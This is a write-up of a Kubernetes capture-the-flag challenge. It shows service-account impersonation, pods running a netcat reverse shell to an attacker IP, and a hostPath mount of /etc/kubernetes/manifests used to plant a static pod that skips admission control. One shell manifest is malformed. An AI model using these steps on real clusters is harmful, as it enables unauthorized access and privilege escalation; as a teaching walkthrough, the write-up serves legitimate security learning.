# Solution

## Overview

The cluster is a vanilla instance of [kind] (v0.7.0) with some very strict RBAC
rules and Pod Security Policies configured for several accounts and namespaces.
You start as the "goose" in the "garden" namespace and must enumerate your
environment and discover the challenge itself. It does **NOT** require
exploiting the host in any way. It is 100% achievable through Kubernetes.

- [Environment](#environment)
- [Start](#start)
- [Step 1 (Steal the groundskeepers keys)](#Todo-1---Steal-the-groundskeepers-keys)
- [Step 2 (Get to the Pub)](#Todo-2---Get-to-the-Pub)
- [Step 3 (Get into the model-village)](#Todo-3---Get-into-the-model-village)
- [Step 4 (Steal the beautiful miniature golden bell)](#Todo-4---Steal-the-beautiful-miniature-golden-bell)
- [Step 5 (...and take it all the way back home)](#Todo-5---and-take-it-all-the-way-back-home)
- [TL;DR](#TLDR)


---

## Environment

**Namespaces:**
- **garden** - Where you (the goose) start.
- **home** - The home for the naughty goose.
- **pub** - Most of the villagers are at the pub. Some have access to other
  namespaces.
- **model-village** - Where the [bell] is located.

**CRDs:**
 - **todos.honk.ci** - A list of "todos" and hints. These are the list of tasks
   to complete the challenge.

**Misc:**
- honkctl's output was truncated to 275 characters to fall within twitter's
  limits. This added a significant layer of difficulty.
- Read access was granted to every account for the todos. 
- Every account could get/list/watch all namespaces.
- There are numerous "distractions". Unrelated pods etc.
- In addition to the challenges/hints in the todos, hints were hidden throughout
  the objects. These were not always obvious. >:D

---

## Start

The [goose] service account is limited to two namespaces [garden][ns] and
[home][ns]. It cannot create any objects, but can `get`/`list`/`watch` namespace
scoped resources and certain cluster scoped (namespaces, todos) resources.

Getting CRDs and then getting todos will result in the challenge.
```
$ kubectl get crds
NAME            CREATED AT
todos.honk.ci   2020-03-31T22:45:20Z

$ kubectl get todos
NAME     TODO
todo-1   Steal the groundskeepers keys.
todo-2   Get to the Pub.
todo-3   Get into the model-village.
todo-4   Steal the beautiful miniature golden bell.
todo-5   ...and take it all the way back home.
```

The todos themselves have additional hints if inspected closer:
```
kubectl get todo todo-1 -o yaml
apiVersion: honk.ci/v1
kind: Todo
metadata:
  creationTimestamp: "2020-03-31T22:45:31Z"
  generation: 1
  name: todo-1
  resourceVersion: "760"
  selfLink: /apis/honk.ci/v1/todos/todo-1
  uid: 0dadd94a-849d-4ee9-8b0e-3e161a4c8019
spec:
  hint: Sometimes one must become that they honk to reach ones goals.
  todo: Steal the groundskeepers keys.
```
The hints for each challenge are as follows:

- **[todo-1](#Todo-1---Steal-the-groundskeepers-keys)**
  - **todo:** Steal the groundskeepers keys
  - **hint:** Sometimes one must become that they honk to reach ones goals.
- **[todo-2](#Todo-2---Get-to-the-Pub)**
  - **todo:** Get to the Pub
  - **hint:** Let's go to the Winchester, have a nice cold pint, and wait for this all to blow over
- **[todo-3](#Todo-3---Get-into-the-model-village)**
  - **todo:** Get into the model-village
  - **hint:** the grizzly knows the way
- **[todo-4](#Todo-4---Steal-the-beautiful-miniature-golden-bell)**
  - **todo:** Steal the beautiful miniature golden bell
- **[todo-5](#Todo-5---and-take-it-all-the-way-back-home)**
  - **todo:** ...and take it all the way back home
  - **hint:** Cloning oneself should be illegal

---

## Todo 1 - Steal the groundskeepers keys

**Hint:** Sometimes one must become that they honk to reach ones goals.

This is easier than it first appears. There is another service account in th
garden namespace called "groundskeeper".

```
$ kubectl get sa
NAME            SECRETS   AGE
default         1         21h
goose           1         21h
groundskeeper   1         21h
```
While the goose account has little to no access to anything, it **DOES** have
the ability to [impersonate] the [groundskeeper] with `--as`.

```
$ kubectl get po --as system:serviceaccount:garden:groundskeeper
NAME                            READY   STATUS    RESTARTS   AGE
groundskeeper-99c96696f-kvwqx   1/1     Running   0          21h
```

---

## Todo 2 - Get to the Pub

**Hint:** Let's go to the Winchester, have a nice cold pint, and wait for this
all to blow over.

Todo-1 and Todo-2 are closely related. As the goose you cannot enumerate anything
within the [pub][ns] namespace.

```
$ kubectl get ns
NAME              STATUS   AGE
default           Active   21h
garden            Active   21h
home              Active   21h
kube-node-lease   Active   21h
kube-public       Active   21h
kube-system       Active   21h
model-village     Active   21h
pub               Active   21h

$ kubectl get po -n pub
 Error from server (Forbidden): pods is forbidden: User "system:serviceaccount:garden:goose" cannot list resource "pods" in API group "" in the namespace "pub"
```

However as the groundskeeper...
```
$ kubectl get po --as system:serviceaccount:garden:groundskeeper -n pub
NAME                               READY   STATUS      RESTARTS   AGE
barkeep-7fd8878887-n9r8t           1/1     Running     0          21h
burly-man-56588df9dd-5qzj4         1/1     Running     0          21h
delivery-person-65d5c4fcf7-z8849   1/1     Running     0          21h
old-man-bf794945f-twjn5            1/1     Running     0          21h
woman-0                            1/1     Running     0          21h
woman-1                            1/1     Running     0          21h
```

You have access to the [pub][ns] **AS** the groundskeeper with access to quite
a bit more.

```
$ kubectl access-matrix --as system:serviceaccount:garden:groundskeeper -n pub
NAME                                            LIST  CREATE  UPDATE  DELETE
bindings                                              ✖
configmaps                                      ✔     ✔       ✔       ✔
controllerrevisions.apps                        ✔     ✖       ✖       ✖
cronjobs.batch                                  ✔     ✔       ✔       ✔
daemonsets.apps                                 ✔     ✔       ✔       ✔
deployments.apps                                ✔     ✔       ✔       ✔
endpoints                                       ✔     ✔       ✔       ✔
events                                          ✔     ✖       ✖       ✖
events.events.k8s.io                            ✖     ✖       ✖       ✖
horizontalpodautoscalers.autoscaling            ✔     ✔       ✔       ✔
ingresses.extensions                            ✔     ✔       ✔       ✔
ingresses.networking.k8s.io                     ✔     ✔       ✔       ✔
jobs.batch                                      ✔     ✔       ✔       ✔
leases.coordination.k8s.io                      ✖     ✖       ✖       ✖
limitranges                                     ✔     ✖       ✖       ✖
localsubjectaccessreviews.authorization.k8s.io        ✖
networkpolicies.networking.k8s.io               ✔     ✔       ✔       ✔
persistentvolumeclaims                          ✔     ✔       ✔       ✔
poddisruptionbudgets.policy                     ✔     ✔       ✔       ✔
pods                                            ✔     ✔       ✔       ✔
podtemplates                                    ✖     ✖       ✖       ✖
replicasets.apps                                ✔     ✔       ✔       ✔
replicationcontrollers                          ✔     ✔       ✔       ✔
resourcequotas                                  ✔     ✖       ✖       ✖
rolebindings.rbac.authorization.k8s.io          ✖     ✖       ✖       ✖
roles.rbac.authorization.k8s.io                 ✖     ✖       ✖       ✖
secrets                                         ✔     ✔       ✔       ✔
serviceaccounts                                 ✔     ✔       ✔       ✔
services                                        ✔     ✔       ✔       ✔
statefulsets.apps                               ✔     ✔       ✔       ✔
```

However those rights are ONLY extended to the pub namespace. It has no rights
to any others.
```
$ kubectl get po --as system:serviceaccount:garden:groundskeeper -n home
Error from server (Forbidden): pods is forbidden: User "system:serviceaccount:garden:groundskeeper" cannot list resource "pods" in API group "" in the namespace "home"

$ kubectl get po --as system:serviceaccount:garden:groundskeeper -n model-village
Error from server (Forbidden): pods is forbidden: User "system:serviceaccount:garden:groundskeeper" cannot list resource "pods" in API group "" in the namespace "model-village"
```

The groundskeeper has a strict [Pod Security Policy][psp] preventing running
privileged etc.

---

## Todo 3 - Get into the model-village

**Hint:** the grizzly knows the way

Each application being served within the pub namespace is a simple nginx
container serving up an ascii image loaded from an associated configmap.
The configmaps themselves are there as a distraction, but also serve as a
"hint" for later.

```
$ kubectl get po --as system:serviceaccount:garden:groundskeeper -n pub --show-labels
NAME                               READY   STATUS    RESTARTS   AGE   LABELS
barkeep-7fd8878887-n9r8t           1/1     Running   0          22h   host=true,pint-glass=true,pod-template-hash=7fd8878887
burly-man-56588df9dd-5qzj4         1/1     Running   0          22h   bucket=true,pod-template-hash=56588df9dd
delivery-person-65d5c4fcf7-z8849   1/1     Running   0          22h   box=true,pod-template-hash=65d5c4fcf7
old-man-bf794945f-twjn5            1/1     Running   0          22h   dartboard=true,pod-template-hash=bf794945f
woman-0                            1/1     Running   0          22h   controller-revision-hash=woman-79d4b7f5b9,flower=true,statefulset.kubernetes.io/pod-name=woman-0
woman-1                            1/1     Running   0          22h   controller-revision-hash=woman-79d4b7f5b9,flower=true,statefulset.kubernetes.io/pod-name=woman-1
```


```
$ kubectl get cm --as system:serviceaccount:garden:groundskeeper -n pub --show-labels
NAME         DATA   AGE   LABELS
box          1      22h   <none>
bucket       1      22h   <none>
dartboard    1      22h   <none>
flower       1      22h   <none>
pint-glass   1      22h   <none>
```

For example the [oldman] serves up an image of a dartboard:
```
        ,-'"""`-,    ,-----.
      ,' \ _|_ / `.  | 501 |
     /`.,'\ | /`.,'\ `-----'  |
    (  /`. \|/ ,'\  )      |  H
    |--|--;=@=:--|--|   |  H  U
    (  \,' /|\ `./  )   H  U  |
     \,'`./ | \,'`./    U  | (|)
      `. / """ \ ,'     | (|)
        '-._|_,-`      (|)
```

Each "app" has an associated Service Account.
```
$ kubectl get sa --as system:serviceaccount:garden:groundskeeper -n pub --show-labels
NAME              SECRETS   AGE   LABELS
barkeep           1         22h   host=true,pint-glass=true
burly-man         1         22h   bucket=true
default           1         22h   <none>
delivery-person   1         22h   box=true
old-man           1         22h   dartboard=true
woman             1         22h   flower=true
```

You cannot impersonate twice, so at this point it's time for everyone's favorite
...a remote shell!

Example remote shell pod using netcat.
```
apiVersion: v1
kind: Pod
metadata:
  name: goose-burly-man
  namespace: pub
spec:
  serviceAccountName: burly-man
  containers:
  - image: alpine:latest
    name: goose-burly-man
    command:
      - sh
      - -c
      - while true; do nc 192.168.1.10 5555 -e sh; done
```

On your local system you would run an instance like this:
```
nc –lvp 5555
```
For more information on remote shell techniques, check this handy [how-to].


If you iterate through trying the various service accounts, grabbing kubectl
and testing if they have access, 2 of the 5 named service accounts do: [barkeep]
and [burly-man]. However, only burly-man has access to the [model-village][ns]
namespace.

```
kubectl get po -n model-village --show-labels
No resources found in model-village namespace.
```


---

## Todo-4 - Steal the beautiful miniature golden bell

Using the shell in the burly-man pod. It's time to take a look at the model
village.

```
$ kubectl get all -n model-village
No resources found in model-village namespace.
```

Not all resources appear when using the _all_ keyword.

```
$ kubectl get cm -n model-village
NAME   DATA   AGE
bell   1      24h
```

A closer look at the bell configMap reveals a beautiful golden manifest.
```
$ kubectl get cm bell -n model-village
apiVersion: v1
data:
  bell.yaml: |
    apiVersion: v1
    kind: Pod
    metadata:
      name: bell
      namespace: home
      annotations:
        description: "A beautiful golden bell."
      labels:
        beautiful: 'true'
    spec:
      containers:
      - name: bell
        image: mrbobbytables/bell:latest
        ports:
        - containerPort: 80
kind: ConfigMap
metadata:
  creationTimestamp: "2020-03-31T22:45:21Z"
  labels:
    location: tower
  name: bell
  namespace: model-village
  resourceVersion: "729"
  selfLink: /api/v1/namespaces/model-village/configmaps/bell
  uid: 90c44ccf-41b7-40fe-a2a3-9a66c4756b45
```

With the bell in hand, now we just have to take it home...but where is home?

---

## Todo-5 - ...and take it all the way back home

**Hint:** Cloning oneself should be illegal

**NO** account we have can impersonate or use has access to the home namespace.
What if there was a different way? A way without cluster-admin. Well..there is.

A manifest dropped into the host mount location of `/etc/kubernetes/manifests`
on a control plane node of a kubeadm (kind) provisioned cluster bypasses all
admission control. If deleted via `kubectl`, kubelet will do it's thing and spin
up a new one.

There are a few hints:
...and take it all the way back _**home**_
```
$ kubectl get ns --show-labels
NAME              STATUS   AGE   LABELS
default           Active   26h   <none>
garden            Active   26h   <none>
home              Active   26h   location=etc-kubernetes-manifests
kube-node-lease   Active   26h   <none>
kube-public       Active   26h   <none>
kube-system       Active   26h   <none>
model-village     Active   26h   <none>
pub               Active   26h   <none>
```

WHO has access to it is subtly hinted 
```
$ kubectl get sa -n pub --show-labels
NAME              SECRETS   AGE   LABELS
barkeep           1         26h   host=true,pint-glass=true
burly-man         1         26h   bucket=true
default           1         26h   <none>
delivery-person   1         26h   box=true
old-man           1         26h   dartboard=true
woman             1         26h   flower=true
```

The barkeep is the "host" and now we need a 2nd shell.

```
apiVersion: v1
kind: Pod
metadata:
  name: goose-barkeep-hostmount
  namespace: pub
spec:
  serviceAccountName: barkeep
  containers:
  - image: alpine:latest
    name: goose-barkeep
    command:
      - sh
      - -c
      - while true;  192.168.1.10 5556 -e sh; done
    volumeMounts:
    - mountPath: /kube
      name: kube
    - mountPath: /goose-home
      name: home
  volumes:
  - name: home
    hostPath:
      path: /etc/kubernetes/manifests
```

With that you can drop in the `bell.yaml` manifest from the previous step into
`/etc/kubernetes/manifests`. If you get pods you should see this in the home
namespace:
```
$ kubectl get po -n home
NAME                         READY   STATUS    RESTARTS   AGE
bell-honkctl-control-plane   1/1     Running   0          17s
```

and if you happen to curl the bell service...
```
   ,,,   .,,.   ,,,    ,,,   ,,,    ,,,   .,,.   ,,,    ,,,   ,,,    ,,,   ..,.   ,,,    ,,,   ,,,    ,,,   .,,.   ,,,   .,,,   ,.,    ,,,   ,,,.   ,,,   .,,,
...   ...    ...   ....   ...   ....   ...    ...   ....   ...   ....   ...    ...   ....   ...   ....   ...    ...   ...    ...   ....   ...    ...   ...    .
.,,   ..,    ,.,   .,..   ..,   ...,   ,.,    ,..   ..,.   ..,   .,.,   ,..    ..,   ..,.   ,.,   .,..   ..,    ..,   ,..    ,..   ..,.   ..,    ,.,   ,..    .
   ..,   ....   ,..    ,..   ,.,    ..,   .,..   ,,.    .,,   ,.,    ,.,   .,..   ..,    ..,   ,..    ...   ..,.   ,.,   .,.,   ,,.    .,,   ,.,.   ,.,   .,..
   ,,,   .,,.   ,,,    ,,,   ,,,    ,,,   .,,.   ,,,    ,,,   ,,,    .,,   .,,.   ,,,    ,,,   ,,,    ,,,   .,,.   ,,,   .,,,   ,,,    ,,,   ,,,.   ,,,   .,,,
,,,   ,,,    ,,,   .,,.   ,,,   .,,,   ,,,    ,,,   ,,,.   ,,,   .,,,   ,,,    ,,,   ,,,.   ,,,   .,,.   ,,,    ,,,   ,,,    ,,,   .,,.   ,,,    ,,,   ,,,    ,
   ,,,   .,,.   ,,,    ,,,   ,,.    ,,,   .,,.   ,,,    ,,,   .,,    ,,,   ..,.   ,,,    ,,,   ,,,    ,,,   .,,.   ,,,   .,,,   ,,,    ,,,   .,,.   ,,,   .,,,
   ,,,   .,,.   ,,,    ,,,   ,,./&@@@@&   .,,.   ,,,    ,,,   ,,,    ,,,   .,,.   ,,,    ,,,   ,,,    ,,,   .,,.   ,,,   .,,,   ,,,    ,,,   ,,,.   ,,,   .,,,
,,,   ,,,    ,,,   .,,.   ,,.@@@@@@@@@@@@&    ,,,   ,,,.   ,,.   .,,,   ,,,    ,,,   ,,,.   ,,,   .,,.   ,,,    ,,,   ,,,    ,,,   .,,.   ,,,    ,,,   ,,,    ,
.,,   ,.,    ,..   .,..   .%@@@&,,,,,,.&@@@   ,..   ,,,.   ,,.   .,..   ,,.    ..,   ,.,.   ,..   .,..   ..,    ..,   ,..    ,..   ..,.   ,.,    ,..   ,,.    .
   ,,,   .,,.   ,,,    ,,,#@@@,,,,,,,,../@@&,.   *&@@@@@@@@@@@@@@@@/ .,,   .,,.   ,,,    ,,,   ,,,    ,,,   .,..   .,,   .,,,   ,,,    ,,,   ,,,.   ,,,   .,,,
,,,   .,.    ,,,   .,,.   @@@,,,,,,,,,..*@@@/@@@@@@@@@@&%####&&@@@@@@@@@%,,    ,,,   .,..   ,,,   .,,.   ,,.    ,,,   ,,,    ,,,   .,,.   ,,,    ,,.   ,,,    ,
,,,   ,,,    ,,,   .,,.   @@@,,,,,,,,..*@@@@@@@@(********************%@@@@@@%  .,,   ,,,.   ,,,   .,,.   ,,,    ,,,   ,,,    ,,,   .,,.   ,,,    ,,,   ,,,    ,
   ,,,   .,,.   ,,,    ,,.#@@@,,,,,,,,@@@@@%*****************************/@@@@@@. ,,,    ,,,   ,,,    ,,,   .,,.   ,,,   .,,,   ,,,    ,,,   ,,,.   ,,,   .,,,
   ,,,   .,,.   ,,,    ,,, *@@@@@@@@@@@@#***********************************,%@@@@@,,    ,,,   ,,,    ,,,   .,,.   ,,,   .,,,   ,,,    ,,,   .,,.   ,,,   .,,,
.,,   ..,    ,.,   .,..   ... ,%@@@@@@******************************************(@@@@@,,.   ,.,   .,..   ..,    ..,   ,..    ,..   ..,.   ..,    ,.,   ,..    .
   ,,,   .,,.   ,,,    ,,,   ,,#@@@&**********************************************,&@@@@#.,,   ,,,    .,,   .,,.   .,,   .,,,   ,.,    ,,,   ,,,.   ,,,   .,,,
   ,,,   .,,.   ,,,    ,,,   ,@@@@****************************************************@@@@%.   ,,,    ,,,   .,,.   ,,,   .,,,   ,.,    ,,,   ,,,.   ,,,   .,,,
,,,   ,,,    ,,,   .,,.   ,,#@@@*******************************************************,&@@@@,,   .,,.   ,,,    ,,,   ,,,    ,,,   .,,.   ,,,    ,,,   ,,,    ,
...   ...    ...   ....   .@@@@**********************************************************,%@@@@.  ....   ...    ...   ...    ...   ....   ...    ...   ...    .
   ,,,   .,,.   ,,,    ,.,%@@@*************************************************************,#@@@@,    ,,,   .,,.   ,,,   .,,,   ,,,    ,,,   ,,,.   ,,,   .,,,
,.,   ,,.    ,,,   ..,.  #@@@***************************************************************,,(@@@@,..   ,,.    ,,,   ,,,    ,,,   .,..   ,,.    ,,,   ,,,    ,
.,,   ,.,    ,.,   .,..  @@@/****************************************************************,,,(@@@@/   ..,    ..,   ,..    ,..   ..,.   ,.,    ,.,   ,,.    .
   ,,,   .,,.   ,,,    ,*@@@*******************************************************************,,**@@@@@.   .,..   ,,,   ..,.   ,.,    ,.,   ,,,.   ,,,   .,,,
   ...   ....   ...    .%@@#********************************************************************,,,,,&@@@@% ....   ...   ....   ...    ...   ....   ...   ....
,,,   ,,,    ,,,   .,,. %@@(**********************************************************************,,,,,,&@@@@@. ,.,   ,,,    ,,,   .,,.   ,,,    ,,,   ,,,    ,
   ,,,   .,,.   ,,,    ,#@@%***********************************************************************,,,,,,,,&@@@@@% ,,,   .,,,   ,,,    ,,,   ,,,.   ,,,   .,,,
   ,,.   .,,.   ,,,    ,,@@@,*********************************************************************,**,,(&@@@@@@@@@@@@@.  .,,,   ,,,    ,,.   ,,,.   ,,.   .,,,
,,,   ,,,    ,,,   .,,.  @@@********************************************************************/%@@@@@@@@@@@%(/*,(@@@@@@@&. .,,   .,,.   ,,,    ,,,   ,,,    ,
   ...   ....   ...    ..&@@@**************************************************************(@@@@@@@@@(*,*,,,,,,,,,,,,,,%@@@@@@@@%..    ...   ....   ...   ....
   ,,.   .,,.   ,,,    ,,.@@@**********************************************************&@@@@@@@#*********,,,,,,,,,,,,,,,,,,,(@@@@@@@@@%*.,   ,,,.   ,,,   .,,,
,..   .,,    ,,,   .,,.   *@@@*****************************************************&@@@@@@#****************,,,,,,,,,,,,,,,,,,,,,,,#@@@@@@@@@@,   ,.,   ,,,    ,
,.,   ,,,    ,,,   .,,.   ,@@@%,,**********************************************%@@@@@@(*********************,,,,,,,,,,,,,,,,,,,,,,,,,,,,/&@@@@@@@@@(   ,,,    ,
   ,,,   .,,.   ,,,    ,,,  @@@#,,,*****************************************&@@@@@#***************************,,,,,,,,,,,,,,,,,,,,,,,,,*&@@@@@@@@@@@@,,   .,,,
...   ...    ...   ....   ...@@@**,,*************************************%@@@@@********************************,,,,,,,,,,,,,,,,,,,#@@@@@@@@@#*,,,,@@@. ...    .
.,,   ,.,    ,.,   .,..   .., @@@(,,,,********************************&@@@@&*************************************,,,,,,,,,,,,&@@@@@@@%********,,,%@@@  ,,.    .
   ,,.   .,,.   ,,,    ,,,   ,,@@@/,,,,,****************************@@@@@******************************************,,,,,/@@@@@@@%***************(@@@,,,   .,,,
   ,,,   .,,.   ,,,    .,,   ,,.@@@#,,,,*************************(@@@@(********************************************,(@@@@@@@/******************@@@@ ,,,   ..,,
,,,   ,,,    ,,,   ..,.   ,,,   ,@@@(,,,,,*********************(@@@@(*******************************************/@@@@@@%*********************/@@@&.,   ,,,    ,
   ,,.   .,,.   ,,,    ,,,   ,,,  @@@%,,,,,******************/@@@@/******************************************@@@@@@&************************@@@@*   ,,,   .,,,
   ,,,   .,,.   ,,,    ,,,   ,,,   @@@(,,,,,,***************@@@@/****************************************#@@@@@@/*************************#@@@&..   ,,,   .,,,
,,,   ,,,    ,,,   .,,.   ,,,   .,,.@@@*,,,,,,,***********#@@@%***************************************&@@@@@%////////*******************(@@@@    ,,,   ,,,    ,
,,,   ,,.    ,,,   .,,.   ,,,   .,,,.@@@*,,,,,,,*********@@@@*************************************/@@@@@@/////////////****************/@@@@*,    ,,,   ,,,    ,
   ,,,   .,,.   ,,,    ,,,   ,,,    ,,@@@,,,,,,,,******,@@@%***********************************(@@@@@%/////////////////*************/@@@@/   ,,,.   ,,,   .,,,
,,.   ,,,    ,,,   .,,.   ,,,   .,,.  /@@@,,,,,,,,*****@@@(*********************************#@@@@@%//////////////////////*********/@@@@*  ,,,    ,,,   .,,    ,
,,,   ,,,    ,,,   .,,.   ,,.   .,,,   &@@@,,,,,,,,,**@@@********************************&@@@@@(//////////////////////////******#@@@@,.   ,,,    ,,,   ,,,    ,
   ,,,   .,,.   ,,,    ,,,   ,,,    ,,. @@@#,,,,,,,,*@@@******************************#@@@@@(//////////////////////////////***%@@@@    ,,,   ,,,.   ,,,   .,,,
   ...   ....   ...    ...   ...    ...  @@@/,,,,,,,@@@(***************************(@@@@@(/((//////////////////////////////*@@@@@..    ...   ....   ...   ....
.,,   ,.,    ,.,   .,..   ..,   ...,   ,,(@@@,,,,,,,,,,,,************************@@@@@%((((((/////////////////////////////@@@@&.   ..,.   ,.,    ,.,   ,,.    .
   ,,,   .,,.   ,,,    .,,   ,,,    ,,,   &@@#,,,,,,,,,,,,,*******************%@@@@%//(((((((((////////////////////////%@@@@(   ,,,    ,,,   ,,,.   ,,,   ..,,
   ,,,   .,,.   ,,,    ,,,   .,,    ,,,   .@@@,,,,,,,,,,,,,*****************@@@@@////((((((((((((////////////////////&@@@@,,,   ,,,    ,,,   ,,,.   ,,,   .,,,
,,,   ,,,    ,,,   .,,.   ,,,   .,,,   ,,, &@@&,,,,,,,,,,,,,,************#@@@@@////////((((((((((((///////////////(@@@@%.    ,,,   .,,.   ,,,    ,,,   .,,    ,
...   ...    ...   ....   ...   ....   ... .@@@,,,,,,,,,,,,,,,,********&@@@@@@@@@(///////((((((((((/////////////&@@@@(...    ...   ....   ...    ...   ...    .
   ..,   ....   ,..    ,..   ,.,    ,.,   .,&@@(,,,,,,,,,,,,,,,,,***,@@@@&,,,,/@@@@////////(((((((((((///////(@@@@@,,,   .,.,   ,,.    .,,   ,.,.   ,.,   .,..
,,,   ,,,    ,,,   .,,.   ,,.   .,,,   ,,,  .@@@,,,,,,,,,,,,,,,,,**@@@@#,,,,,,,,*@@@&/////(/((((((((((((///&@@@@/,,   ,,,    ,,,   .,,.   ,,,    ,,,   ,,,    ,
,,,   ,,,    ,,,   .,,.   ,,,   .,,,   ,,,   @@@,,,,,,,,,,,,,,,,(@@@@,,,,,,,,,,,,.&@@&///////((((((((((/%@@@@%  ,,,   ,,,    ,,,   .,,.   ,,,    ,,,   ,,,    ,
   ,,,   .,,.   ,,,    ,,,   ,,,    ,,,   .,,@@@(,,,,,,,,,,,,,(@@@@,,,,,,,,,,,,,,,.@@@#///////(((((((#@@@@@ .,,.   ,,,   .,,,   ,,,    ,,,   ,,,.   ,,,   .,,,
...   ...    ...   ....   ...   ....   ...   &@@&,,,,,,,,,,,(@@@@,,,,,,,,,,,,,,,,,,%@@@////////(/((@@@@@/...    ...   ...    ...   ....   ...    ...   ...    .
,,,   ,,,    ,,,   .,,.   ,,,   .,,,   ,,,   (@@@,,,,,,,,,*@@@@,,,,,,,,,,,,,,,,,,,,%@@@/////////@@@@@#   ,,,    ,,,   ,,,    ,,,   .,,.   ,,,    ,,,   ,,,    ,
   ,,,   .,,.   .,,    ,,,   ,,,    ,,,   .,,/@@@,,,,,,,,@@@@*,,,,,,,,,,,,,,,,,,,,,@@@%//////%@@@@@   ,,,   .,,.   ,,,   .,,,   ,,,    ,,,   ,,,.   .,,   .,,,
   ,,,   .,,.   ,,,    ,,,   ,,,    ,,,   .,,*@@@,,,,,,%@@@(*,,,,,,,,,,,,,,,,,,,,,%@@@////&@@@@@,,    ,,,   .,,.   ,,,   .,,,   ,,,    ,,,   ,,,.   ,,,   .,,,
,,,   ,,,    ,,,   ..,.   ,.,   .,,,   ,,,   ,@@@,,,,,@@@@*,,,,,,,,,,,,,,,,,,,,,,@@@@//%@@@@@*,   ..,.   ,,,    ,,,   ,,,    ,,,   .,,.   ,,,    ,,,   ,,,    ,
   ...   ....   ...    ...   ...    ...   ...*@@@,,,@@@@/**,,,,,,,,,,,,,,,,,,,,%@@@%%@@@@@,.   ...    ...   ....   ...   ....   ...    ...   ....   ...   ....
   ,,,   .,,.   ,,,    ,,,   ,,,    ,,,   .,,/@@@,,@@@@@@@,,,,,,,,,,,,,,,,,,,%@@@@@@@@@. ,,,   ,,,    ,,,   .,,.   ,,,   .,,.   ,,,    ,,,   ,,,.   ,,.   .,,,
,,,   ,,,    ,,,   .,,.   ,,,   .,,,   ,,,   #@@@/@@@#*%@@@@*,,,,,,,,,,,,,&@@@@@@@@&..,..   ,,,   .,,.   ,,,    ,,,   ,,,    ,,,   .,,.   ,,,    ,,,   ,,,    ,
,,,   .,,    ,,,   .,,.   ,,.   .,,,   ,,,   &@@@@@@*****/@@@@@@@@&&@@@@@@@@@@@@/,   .,,.   ,,,   .,,.   ,,.    ,,,   ,,,    ,,,   .,,.   ,,.    ,,,   ,,,    ,
   ,,,   .,,.   ,,,    ,,,   ,,,    ,,,   .,,@@@@@@**********&@@@@@@@@@@@@@@&,.   ,,,    ,,,   ,,,    ,,,   .,,.   ,,,   .,,,   ,.,    ,,,   ,,,.   ,,,   .,,,
,,,   ,,,    ,,,   .,,.   ,,.   .,,.   ,,,   @@@@@***************(@@@@@@@*,    ,,,   ,,,.   ,,,   .,,.   ,,.    ,,.   ,,,    .,,   .,,.   ,,,    ,,.   ,,,    ,
,,,   ,,,    ,,,   ..,.   ,,,   .,,,   ,,,   @@@@***********(@@@@@@@@.  ,,,    ,,,   ,,,.   ,,,   ..,.   ,,,    ,,,   ,,,    ,,,   .,,.   ,,,    ,,.   ,,,    ,
   ..,   ....   ,..    ,..   ..,    ,.,   .,.@@@@@@&&@@@@@@@@@@@#    ,.,   .,..   ..,    ..,   ,..    ,..   ..,.   ,.,   .,.,   ,,.    ..,   ,.,.   ,.,   .,..
   ,,,   .,,.   ,,,    ,,,   .,.    ,,,   .,,. %@@@@@@@@@@%.  ,,,    ,,,   .,,.   ,,.    ,,,   ,,,    ,,,   .,..   ,,,   .,,,   ,,,    ,,,   .,,.   ,,,   .,,,
,,,   ,,,    ,,,   .,,.   ,,,   .,,,   ,,,    ,,,   ,,..   ,,,   .,,,   ,,,    ,,,   ,,,.   ,,,   .,,.   ,,,    ,,,   ,,,    ,,,   .,,.   ,,,    ,,,   ,,,    ,
   ,,,   .,,.   ,,,    ,,,   ,,,    ,,,   .,,.   ,,,    ,,,   .,,    ,,,   ..,.   ,,,    ,,,   ,,,    ,,,   .,,.   ,,,   .,,,   ,,,    ,,,   .,,.   ,,,   .,,,
   ,,,   .,,.   ,,,    ,,,   ,,,    ,,,   .,,.   ,,,    ,,,   ,,,    ,,,   .,,.   ,,,    ,,,   ,,,    ,,,   .,,.   ,,,   .,,,   ,,,    ,,,   ,,,.   ,,,   .,,,
,,,   ,,,    ,,,   .,,.   ,,,   .,,,   ,,,    ,,,   ,,,.   ,,.   .,,,   ,,,    ,,,   ,,,.   ,,,   .,,.   ,,,    ,,,   ,,,    ,,,   .,,.   ,,,    ,,,   ,,,    ,
...   ...    ...   ....   ...   ....   ...    ...   ....   ...   ....   ...    ...   ....   ...   ....   ...    ...   ...    ...   ....   ...    ...   ...    .
   ,,,   .,,.   ,,,    ,,,   ,,,    ,,,   .,,.   ,,,    ,,,   ,,,    ,,,   .,,.   ,,,    ,,,   ,,,    ,,,   .,,.   ,,,   .,,,   ,.,    ,,,   ,,,.   ,,,   .,,,
,,,   ,,.    ,,,   .,,.   ,,,   .,,,   ,,,    ,,,   ,,,.   ,,,   .,,,   ,,,    ,,,   ,,..   ,,,   .,,.   ,,,    ,,,   ,,,    ,,,   .,,.   ,,,    ,,,   ,,,    ,
,,.   ,,,    ,,.   .,,.   ,,,   .,,,   ,,,    ,,,   ,,,.   ,,,   .,,.   ,,,    ,,.   ,,,.   ,,.   .,,.   ,,,    ,,,   ,,,    ,,,   .,,.   ,,,    ,,.   ,,,    ,

```


Tada~


---

## TL;DR

```
NAME     TODO
todo-1   Steal the groundskeepers keys.
todo-2   Get to the Pub.
todo-3   Get into the model-village.
todo-4   Steal the beautiful miniature golden bell.
todo-5   ...and take it all the way back home.
```
The goose has limited access
1. Use `system:serviceaccount:garden:groundskeeper` to explore the pub and spin
   up Pods
2. As groundskeeper spin up a Pod (with a reverse shell) as the burly man — he
   has access to the get items in the model-village.
3. Get the bell Pod template from the ConfigMap in the model village
4. Use the groundskeeper to spin up a pod as the barkeep (note - they have ‘host’
   in their labels)
5. Spin up a pod as barkeep and mount `/etc/kubernetes/manifests`. The barkeep
   has host mount access, but limited to “home” aka `/etc/kubernetes/manifests`.
   If you view labels on the home Namespace, it will list its location as:
   `etc-kubernetes-manifests`
6. Drop the bell manifest in the dir and boom — the bell is home and the game is
   won.




[kind]: https://kind.sigs.k8s.io
[ns]: manifests/02/00-namespaces.yaml
[goose]: manifests/02/03-goose.yaml
[groundskeeper]: manifests/02/04-groundskeeper.yaml
[bell]: manifests/02/10-bell.yaml
[oldman]: manifests/02/08-old-man.yaml
[barkeep]: manifests/02/05-barkeep.yaml
[burly-man]: manifests/02/06-burly-man.yaml
[impersonate]: https://kubernetes.io/docs/reference/access-authn-authz/authorization/#checking-api-access
[psp]: https://kubernetes.io/docs/concepts/policy/pod-security-policy/
[how-to]: https://www.hackingtutorials.org/networking/hacking-netcat-part-2-bind-reverse-shells/